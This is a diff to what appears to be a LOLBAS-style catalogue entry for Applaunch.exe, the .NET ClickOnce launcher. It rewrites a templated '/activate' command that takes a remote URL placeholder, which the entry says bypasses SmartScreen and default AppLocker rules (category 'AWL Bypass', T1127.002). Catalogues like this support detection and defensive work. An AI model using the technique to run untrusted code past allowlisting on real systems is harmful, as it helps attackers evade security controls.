@@ -1,22 +1,19 @@
 ---
 Name: Applaunch.exe
-Description: ClickOnce partial-trust application launcher used by .NET. Can execute self-signed or untrusted ClickOnce applications without SmartScreen or standard AppLocker enforcement.
+Description: Microsoft .NET ClickOnce Launch Utility.
 Author: Nathan Sawyer
-Created: 2025-11-26
+Created: 2026-08-08
 Commands:
-  - Command: >
-      "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe"
-      /activate "{APPLICATION_URL}#{APPLICATION_METADATA}"
-    Description: Launches a ClickOnce application via Applaunch.exe. Bypasses SmartScreen and default AppLocker rules when the application is published as partial trust.
-    Usecase: Execute ClickOnce applications in environments where dfsvc.exe would normally enforce full-trust and SmartScreen checks. Can be abused as an AWL bypass in rare configurations.
+  - Command: '"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe" /activate "{REMOTEURL}#APPLICATION_METADATA_HERE"'
+    Description: Launches a ClickOnce application via `Applaunch.exe`. Bypasses SmartScreen and default AppLocker rules when the application is published as partial trust.
+    Usecase: Execute ClickOnce applications in environments where `dfsvc.exe` would normally enforce full-trust and SmartScreen checks. Can be abused as an AWL bypass in rare configurations.
     Category: AWL Bypass
     Privileges: User
     MitreID: T1127.002
     OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: ClickOnce
-      - Execute: Local
-      - Execute: InstalledApplication
+      - Execute: Remote
 
 Full_Path:
   - Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\Applaunch.exe
@@ -33,4 +30,4 @@ Resources:
   - Link: https://web.archive.org/web/20060913192623/http://blogs.msdn.com/shawnfa/archive/2005/11/30/498610.aspx
 
 Acknowledgement:
-  - Person: Nathan Sawyer (https://nathan2.com)
+  - Person: Nathan Sawyer
